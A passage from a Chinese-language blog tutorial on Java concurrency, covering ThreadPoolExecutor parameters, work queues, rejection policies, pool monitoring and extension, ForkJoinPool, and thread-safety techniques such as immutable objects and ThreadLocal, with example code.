&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以5个为一轮,固定的5个线程执行任务</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822161546596.png" alt="image-20220822161546596"></p>
<h5 id="线程池的关闭"><a href="#线程池的关闭" class="headerlink" title="线程池的关闭"></a>线程池的关闭</h5><p>两个方法</p>
<h6 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown()"></a>shutdown()</h6><p>​    该方法执行后,线程池状态变为SHUTDOWN,不会接收新任务,但是会执行完已提交的任务,此方法不会阻塞调用线程的执行</p>
<p>shutdownNow()</p>
<p>​    该方法执行后,线程池状态变为STOP,不会接收新任务,会将队列中的任务返回,并用interrupt的方式中断正在执行的</p>
<h5 id="Execurors提供的线程池和特点"><a href="#Execurors提供的线程池和特点" class="headerlink" title="Execurors提供的线程池和特点"></a>Execurors提供的线程池和特点</h5><ol>
<li><code>newSingleThreadExecutor()</code> 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。</li>
<li><code>newFixedThreadPool() </code>创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。</li>
<li><code>newScheduledThreadPool() </code>创建一个可定期或者延时执行任务的定长线程池，支持定时及周期性任务执行。 </li>
<li><code>newCachedThreadPool()</code> 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。 </li>
</ol>
<h5 id="核心线程池的底层实现"><a href="#核心线程池的底层实现" class="headerlink" title="核心线程池的底层实现"></a>核心线程池的底层实现</h5><p>查看Executors工具类中<code>newFixedThreadPool</code>,<code>newFixedThreadPool</code>,<code>newSingleThreadExecutor</code>等方法,都调用了<code>ThreadPoolExecutor</code>这个构造方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822163534233.png" alt="image-20220822163534233"></p>
<p>各个参数含义</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>corePoolSize</td>
<td>指定线程池中核心线程的数量                                                                                       CPU 密集型： CPU 核数  + 1                                                               IO 密集型： 2 倍 CPU 核数 + 1</td>
</tr>
<tr>
<td>maximumPoolSize</td>
<td>指定线程池中最大线程数量</td>
</tr>
<tr>
<td>keepAliveTime</td>
<td>当线程池中线程的数量超过corePoolSize时,多余的空闲线程的存活时长,即空闲线程在多长时长内销毁</td>
</tr>
<tr>
<td>unit</td>
<td>是keepAliveTime时长单位</td>
</tr>
<tr>
<td>wordQueue</td>
<td>任务队列,把任务提交到该任务队列中等待执行</td>
</tr>
<tr>
<td>handler</td>
<td>拒绝策略,当任务太多来不及处理时,如何拒绝</td>
</tr>
</tbody></table>
<h6 id="wordQueue"><a href="#wordQueue" class="headerlink" title="wordQueue"></a>wordQueue</h6><p>workQueue工作队列是指提交未执行的任务队列,它是BlockingQueue接口的对象,仅用于存储Runnable任务,根据队列功能分类,在ThreadPoolExecutor构造方法中可以使用以下几种阻塞队列</p>
<p>1.直接提交队列</p>
<p>由<code>SynchronousQueue</code>对象提供,该队列没有容量,提交给线程池的任务不会被真实的保存,总是将新的任务提交给线程执行,如果没有空闲线程,则尝试创建新的线程,如果线程数量已经达到maximumPoolSize规定的最大值则执行拒绝策略</p>
<p>2.有界任务队列</p>
<p>由<code>ArrayBlockingQueue</code>实现,在创建<code>ArrayBlockingQueue</code>对象时,可以指定一个容量,当有任务需要执行时,如果线程池中线程数小于<code>corePoolSize</code>核心线程数则创建新的线程;如果大于<code>corePoolSize</code>核心线程数则加入等待队列;</p>
<p>如果队列已满则无法加入,在线程数小于<code>maximumPoolSize</code>指定的最大线程数前提下会创建新的线程来执行,如果线程数大于<code>maximumPoolSize</code>最大线程数则执行拒绝策略</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822172950757.png" alt="image-20220822172950757"></p>
<p>3.无界任务队列</p>
<p>由<code>LinkedBlockingQueue</code>对象实现,与有界队列相比,除非资源耗尽,否则无界队列不存在任务入队失败的情况,当有新的任务时,在系统线程数小于<code>corePoolSize</code>核心线程数则创建新的线程来执行任务;当线程池中线程数量大于<code>corePoolSize</code>核心线程数则把任务加入阻塞队列</p>
<p>4.优先任务队列</p>
<p>通过<code>PriorityBlockingQueue</code>实现,是带有任务优先级的队列,是一个特殊的无界队列,不管是<code>ArrayBlockingQueue</code>队列还是<code>LinkedBlockingQueue</code>队列都是按照先进先出算法处理任务的,在<code>PriorityBlockingQueue</code>中可以根据任务优先级顺序先后执行</p>
<h5 id="拒绝策略"><a href="#拒绝策略" class="headerlink" title="拒绝策略"></a>拒绝策略</h5><p>当线程池中的线程用完了,等待队列也满了,无法为新提交的任务服务,可以通过拒绝策略来处理这个问题,jdk提供了四种拒绝策略</p>
<h6 id="AbortPolicy"><a href="#AbortPolicy" class="headerlink" title="AbortPolicy"></a>AbortPolicy</h6><p>抛出异常</p>
<h6 id="CallerRunsPolicy"><a href="#CallerRunsPolicy" class="headerlink" title="CallerRunsPolicy"></a>CallerRunsPolicy</h6><p>只要线程池没有关闭,它会在调用者线程中运行当前被丢弃的任务</p>
<h6 id="DiscardOldestPolicy"><a href="#DiscardOldestPolicy" class="headerlink" title="DiscardOldestPolicy"></a>DiscardOldestPolicy</h6><p>将队列中最老的任务(即将要执行的任务)丢弃,尝试再次提交新任务</p>
<h6 id="DiscardPolicy"><a href="#DiscardPolicy" class="headerlink" title="DiscardPolicy"></a>DiscardPolicy</h6><p>直接丢弃这个无法处理的任务</p>
<h5 id="ThreadFactory"><a href="#ThreadFactory" class="headerlink" title="ThreadFactory"></a>ThreadFactory</h5><p>ThreadFactory是一个接口,只有一个用来创建线程的方法:</p>
<p>Thread newThread(Runnable r);</p>
<p>当线程池中需要创建线程时就会调用该方法</p>
<h5 id="监控线程池"><a href="#监控线程池" class="headerlink" title="监控线程池"></a>监控线程池</h5><p>ThreadPoolExecutor提供了一组方法用于监控线程池</p>
<p>int getActiveCount()获得线程池中当前活动线程的数量</p>
<p>long getCompletedTaskCount()返回线程池完成任务的数量</p>
<p>int getCorePoolSize() 线程池中核心线程的数量</p>
<p>int getLargestPoolSize() 返回线程池曾经达到的线程的最大数</p>
<p>int getMaximumPoolSize()返回线程池的最大容量</p>
<p>int getPoolSize()返回当前线程池的大小</p>
<p>getQueue() 返回阻塞队列</p>
<p>long getTaskCount() 返回线程池收到的任务总数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//先定义任务</span></span><br><span class="line">        Runnable r=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getId()+<span class="string">&quot;编号的线程开始执行: &quot;</span>+System.currentTimeMillis());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">10000</span>);<span class="comment">//线程睡眠10秒,模拟任务执行时长</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//定义线程池</span></span><br><span class="line">        ThreadPoolExecutor poolExecutor=<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>, TimeUnit.SECONDS,<span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">5</span>), Executors.defaultThreadFactory(),<span class="keyword">new</span> ThreadPoolExecutor.DiscardPolicy());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向线程池提交30个任务</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            poolExecutor.submit(r);</span><br><span class="line">            System.out.println(<span class="string">&quot;当前线程池核心线程数量&quot;</span>+poolExecutor.getCorePoolSize()+<span class="string">&quot;,最大线程数&quot;</span>+poolExecutor.getMaximumPoolSize()+<span class="string">&quot;,当前线程池大小&quot;</span>+poolExecutor.getPoolSize()+<span class="string">&quot;,收到任务数量:&quot;</span>+poolExecutor.getTaskCount()+<span class="string">&quot;,完成任务数:&quot;</span>+poolExecutor.getCompletedTaskCount()+<span class="string">&quot;,等待任务数&quot;</span>+poolExecutor.getQueue().size());</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------提交完成-------------------&quot;</span>);</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">while</span> (poolExecutor.getActiveCount()&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前线程池核心线程数量&quot;</span>+poolExecutor.getCorePoolSize()+<span class="string">&quot;,最大线程数&quot;</span>+poolExecutor.getMaximumPoolSize()+<span class="string">&quot;,当前线程池大小&quot;</span>+poolExecutor.getPoolSize()+<span class="string">&quot;,收到任务数量:&quot;</span>+poolExecutor.getTaskCount()+<span class="string">&quot;,完成任务数:&quot;</span>+poolExecutor.getCompletedTaskCount()+<span class="string">&quot;,等待任务数&quot;</span>+poolExecutor.getQueue().size());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822191225957.png" alt="image-20220822191225957"></p>
<p>在提交完成后,只收到了15个任务,因为创建的线程池最大线程数为5,最大容量为5,同时等待队列最大容量为5,每半秒提交一个任务,所以30个总共耗时15秒,理论上来说15秒内后面15个线程都没地方可去,执行拒绝策略<code>DiscardPolicy</code>都将其抛弃</p>
<h5 id="扩展线程池"><a href="#扩展线程池" class="headerlink" title="扩展线程池"></a>扩展线程池</h5><p>有时需要对线程池进行扩展,如在监控每个任务的开始和结束时间,或者自定义一些其他增强的功能:</p>
<p>ThreadPoolExecutor线程池提供了两个方法:</p>
<p>afterExecute(),beforeExecute()</p>
<p>在线程池执行某个任务前会调用<code>beforeExecute()</code>,在任务结束后(任务异常退出)会调用<code>afterExecute()</code></p>
<p>查看<code>ThreadPoolExecutor</code>源码,在该类中定义了一个内部类Worker,ThreadPoolExecutor线程池中的工作线程就是Worker类的实例,Worker实例在执行时会调用<code>beforeExecute()</code>与<code>afterExecute()</code>方法</p>
<p>这种重写类似于Spring中的Filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTask</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyTask</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(name+<span class="string">&quot;任务正在被线程&quot;</span>+Thread.currentThread().getId()+<span class="string">&quot; 执行&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定义扩展线程池,可以定义线程池类继承ThreadPoolExecutor方法,在子类中重写beforeExecute()/afterExecute()方法</span></span><br><span class="line">        <span class="comment">//也可以直接使用ThreadPoolExecutor的内部类</span></span><br><span class="line">        ExecutorService executorService=<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>, TimeUnit.SECONDS,<span class="keyword">new</span> LinkedBlockingDeque&lt;&gt;())&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeExecute</span><span class="params">(Thread t, Runnable r)</span> </span>&#123;</span><br><span class="line">                System.out.println(t.getId()+<span class="string">&quot;线程准备执行任务&quot;</span>+((MyTask)r).name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterExecute</span><span class="params">(Runnable r, Throwable t)</span> </span>&#123;</span><br><span class="line">                System.out.println(((MyTask)r).name+<span class="string">&quot;任务执行完毕&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">terminated</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;线程池退出&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建5个任务添加到线程池中执行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            executorService.execute(<span class="keyword">new</span> MyTask(<span class="string">&quot;task--&quot;</span>+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关闭线程池</span></span><br><span class="line">        executorService.shutdown();<span class="comment">//关闭线程池仅仅是说线程池不再接收新的任务,线程池中已接收的任务正常执行完毕</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822232958662.png" alt="image-20220822232958662"></p>
<h5 id="优化线程池数量"><a href="#优化线程池数量" class="headerlink" title="优化线程池数量"></a>优化线程池数量</h5><p>线程池大小对系统性能是有一定影响的,过大或过小都会无法发挥最优的系统性能,线程池大小不需要非常精确,只要避免极大或者极小的情况即可</p>
<p><strong>线程池大小=CPU核心数量×目标CPU的使用率×(1+平均等待时间/平均工作时间)</strong></p>
<h5 id="线程池死锁"><a href="#线程池死锁" class="headerlink" title="线程池死锁"></a>线程池死锁</h5><p>如果在线程池中执行的任务A在执行过程中又向线程池提交了任务B,任务B添加到了线程池的等待队列中,如果任务A的结束需要等待任务B的执行结果,就有可能出现这种情况:<strong>线程池中所有的工作线程都处于等待任务处理结果,而这些任务在阻塞队列中等待执行</strong>,线程池中没有可以对阻塞队列中的任务进行处理的线程,这种等待会一直持续下去,从而造成死锁</p>
<p>   适合给线程池提交相互独立的任务,而不是批次依赖的任务,对于彼此依赖的任务,可以考虑分别提交给不同的线程池来执行</p>
<h5 id="线程池中的异常跟踪"><a href="#线程池中的异常跟踪" class="headerlink" title="线程池中的异常跟踪"></a>线程池中的异常跟踪</h5><p>直接使用原生的submit()方法往线程池添加任务,会将异常吞掉</p>
<ol>
<li>使用execute()添加任务</li>
<li>自定义ThreadPoolExecutor类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TraceThreadPoolExecutor</span> <span class="keyword">extends</span> <span class="title">ThreadPoolExecutor</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TraceThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize, <span class="keyword">int</span> maximumPoolSize, <span class="keyword">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义方法,对执行的任务进行包装,接收两个参数,一个参数接收要执行的任务,另一个参数是Exception异常</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Runnable <span class="title">wrap</span><span class="params">(Runnable task,Exception exception)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            task.run();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            exception.printStackTrace();</span><br><span class="line">                            <span class="keyword">throw</span> e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Future&lt;?&gt; submit(Runnable task) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.submit(wrap(task,<span class="keyword">new</span> Exception(<span class="string">&quot;自定义跟踪异常&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            TraceThreadPoolExecutor traceThreadPoolExecutor = <span class="keyword">new</span> TraceThreadPoolExecutor(<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>, TimeUnit.SECONDS,<span class="keyword">new</span> SynchronousQueue&lt;&gt;());</span><br><span class="line">            traceThreadPoolExecutor.submit(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    System.out.println(<span class="number">0</span>/<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220823000927977.png" alt="image-20220823000927977"></p>
<h5 id="ForkJoinPool线程池"><a href="#ForkJoinPool线程池" class="headerlink" title="ForkJoinPool线程池"></a>ForkJoinPool线程池</h5><p>该线程池采用的是”分治”思想</p>
<p>系统对ForkJoinPool线程池进行了优化,提交的任务数量与线程的数量不一定是一对一关系,在多数情况下,一个物理线程实际上需要处理多个逻辑任务</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220823105618999.png" alt="image-20220823105618999"></p>
<h6 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h6><p>求两个正整数之间所有数的合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test6</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CountTask</span> <span class="keyword">extends</span> <span class="title">RecursiveTask</span>&lt;<span class="title">Long</span>&gt;</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CountTask</span><span class="params">(<span class="keyword">long</span> start, <span class="keyword">long</span> end)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.start = start;</span><br><span class="line">            <span class="keyword">this</span>.end = end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> THRESHOLD=<span class="number">10000</span>;<span class="comment">//阈值为10000</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TASKNUM=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> start;<span class="comment">//计算数列的起始值</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> end;<span class="comment">//计算数列的结束值</span></span><br><span class="line">        <span class="comment">//重写RecursiveTask类的compute()方法</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> Long <span class="title">compute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">long</span> sum=<span class="number">0</span>;<span class="comment">//保存计算的结果</span></span><br><span class="line">            <span class="comment">//判断任务是否需要继续分解,如果当前数列end与start范围的数超过阈值THRESHOLD,就需要继续分解</span></span><br><span class="line">            <span class="keyword">if</span>(end-start&lt;THRESHOLD)&#123;</span><br><span class="line">                <span class="comment">//小于阈值就直接计算</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">long</span> i=start;i&lt;=end;i++)&#123;</span><br><span class="line">                    sum+=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//数列范围超过阈值,需要继续分解</span></span><br><span class="line">                <span class="comment">//约定每次分解成100个小任务,计算每个任务的计算量</span></span><br><span class="line">                <span class="keyword">long</span> step=(end-start)/TASKNUM;</span><br><span class="line">                ArrayList&lt;CountTask&gt; subTaskList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">long</span> pos=start;<span class="comment">//每个任务的起始位置</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TASKNUM; i++) &#123;</span><br><span class="line">                    <span class="keyword">long</span> lastOne=pos+step;<span class="comment">//每个任务的结束位置</span></span><br><span class="line">                    <span class="keyword">if</span>(lastOne&gt;end)&#123;<span class="comment">//调整最后一个任务的结束位置</span></span><br><span class="line">                        lastOne=end;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//创建子任务</span></span><br><span class="line">                    CountTask task=<span class="keyword">new</span> CountTask(pos,lastOne);</span><br><span class="line">                    <span class="comment">//把任务添加到集合中</span></span><br><span class="line">                    subTaskList.add(task);</span><br><span class="line">                    <span class="comment">//使用fork()提交子任务</span></span><br><span class="line">                    task.fork();</span><br><span class="line">                    <span class="comment">//调整下个任务的起始位置</span></span><br><span class="line">                    pos+=step+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//等待所有的子任务结束后,合并计算结果</span></span><br><span class="line">                <span class="keyword">for</span> (CountTask task:subTaskList)&#123;</span><br><span class="line">                    sum+=task.join();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建ForkJoinPool线程池</span></span><br><span class="line">        ForkJoinPool forkJoinPool=<span class="keyword">new</span> ForkJoinPool();</span><br><span class="line">        <span class="comment">//创建一个大任务</span></span><br><span class="line">        CountTask task=<span class="keyword">new</span> CountTask(<span class="number">0</span>,<span class="number">2000000</span>);</span><br><span class="line">        <span class="comment">//把大任务提交给线程池</span></span><br><span class="line">        ForkJoinTask&lt;Long&gt; result=forkJoinPool.submit(task);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Long res=result.get();<span class="comment">//调用任务的get()方法返回结果</span></span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总的来说,这个线程池的用法有点类似递归的写法,和递归一样,什么时候继续向下调用方法,是问题的关键</strong></p>
<h2 id="7-保障线程安全的设计技术"><a href="#7-保障线程安全的设计技术" class="headerlink" title="7.保障线程安全的设计技术"></a>7.保障线程安全的设计技术</h2><h4 id="java运行时存储空间"><a href="#java运行时存储空间" class="headerlink" title="java运行时存储空间"></a>java运行时存储空间</h4><p>Java运行时空间可以分为栈区,堆区与方法区(非堆空间)</p>
<p>​    栈空间为线程的执行准备一段固定大小的存储空间,每个线程都有独立的线程栈空间,创建线城时就为线程分配栈空间,在线程栈中每调用一个方法就给方法分配一个<strong>栈帧</strong>,栈帧用于存储方法的局部变量,返回值等私有数据,即<strong>局部变量存储在栈空间中</strong>,基本类型变量也是存储在栈空间中,引用类型变量值也是存储在栈空间中,引用的对象存储在堆中,由于线程栈是相互独立的,一个线程不能访问另外一个线程的栈空间,因此线程对局部变量以及只能通过当前线程的局部变量才能访问的对象进行的操作具有固定的线程安全性.</p>
<p>​    栈空间用于存储对象,是在JVM启动时分配的一段可以动态扩容的内存空间,创建对象时,在堆空间中给对象分配存储空间,实例变量就是存储在堆空间中的,对空间是多个线程之间可以共享的空间,因此实例变量可以被多个线程共享,多个线程同时操作实例变量可以存在线程安全问题</p>
<p>​    非堆空间用于存储常量,类的元数据等,非堆空间也是在JVM启动时分配的一段可以动态扩容的存储空间,类的元数据包括静态变量,类有哪些方法以及这些方法的元数据(方法名,参数,返回值等),非堆空间也是多个线程可以共享的,因此访问非堆空间中的静态变量也可能存在线程安全问题.</p>
<p>​    ==不被其他线程共享的空间具有固有的局部安全性==</p>
<h4 id="无状态对象"><a href="#无状态对象" class="headerlink" title="无状态对象"></a>无状态对象</h4><p><strong>通俗来讲,无状态对象就是没有变量的对象</strong></p>
<p>​    对象就是数据及对数据操作的封装,对象所包含的数据称为对象的状态(state),实例变量与静态变量称为状态变量</p>
<p>​    如果一个类的同一个实例被多个线程共享并不会使这些线程存储共享的状态,那么该类的实例就称为无状态对象(Stateless Object),反之,如果一个类的实例被多个线程共享会使这些线程存在共享状态,那么该类的实例称为有状态对象,<strong>实际上无状态对象就是不包含任何实例变量的对象,也不包含任何静态变量</strong></p>
<p>​    线程安全问题的前提是多个线程存在共享的数据,实现线程安全的一种办法就是避免在多个线程之间共享数据,使用无状态对象就是这种方法</p>
<h4 id="不可变对象"><a href="#不可变对象" class="headerlink" title="不可变对象"></a>不可变对象</h4><p>​    不可变对象是指一经创建它的状态(数据)就保持不变的对象,不可变对象也具有固有的线程安全性,当不可变对象现实实体的状态发生变化时,系统会创建一个新的不可变对象,就如<strong>String字符串对象</strong></p>
<h5 id="一个不可变对象需要满足以下条件"><a href="#一个不可变对象需要满足以下条件" class="headerlink" title="一个不可变对象需要满足以下条件:"></a><strong>一个不可变对象需要满足以下条件:</strong></h5><ol>
<li>类本身使用final修饰,防止通过创建子类来改变它的定义</li>
<li>所有字段都是final修饰的,final在创建对象时必须显示初始化,不能被修改</li>
<li>如果字段引用了其他状态可变的对象(集合,数组),则这些字段必须是private私有的</li>
</ol>
<p>频繁创建不可变对象可能会提升GC的负担</p>
<h5 id="不可变对象的主要应用场景"><a href="#不可变对象的主要应用场景" class="headerlink" title="不可变对象的主要应用场景"></a>不可变对象的主要应用场景</h5><ul>
<li>被创建的对象的状态变化不频繁</li>
<li>同时对一组相关数据进行写操作,可以应用不可变对象,既可以保障原子性也可以避免锁的使用</li>
<li>使用不可变对象作为安全可靠的Map键,HashMap键值对的存储位置与键的hashCode有关,如果键的内部状态发生了变化会导致键的hashCode不同,可能会影响键值对的存储位置,如果HashMap的键是一个不可变对象,则hashCode()方法的返回值恒定,存储位置是固定的</li>
</ul>
<h4 id="线程特有对象"><a href="#线程特有对象" class="headerlink" title="线程特有对象"></a>线程特有对象</h4><p>​    我们可以选择不共享非线程安全的对象,对于非线程安全的对象,每个线程都创建一个该对象的实例,各个线程访问各自创建的实例,一个线程不能访问另外一个线程创建的实例,这种各个线程创建各自的实例,一个实例只能被线程访问的对象就称为线程特有对象.</p>
<p>​    线程特有对象既保障了对线程安全对象的访问的线程安全,又避免了锁的开销,<strong>线程特有对象也具有固有的线程安全性</strong></p>
<p><code>ThreadLocal&lt;T&gt;</code>类就相当于线程访问其特有对象的代理,即各个线程通过ThreadLocal对象可以创建并访问各自的线程特有对象,泛型T指定了线程特有对象的类型,一个线程可以使用不同的ThreadLocal实例来创建并访问不同的线程特有对象</p>
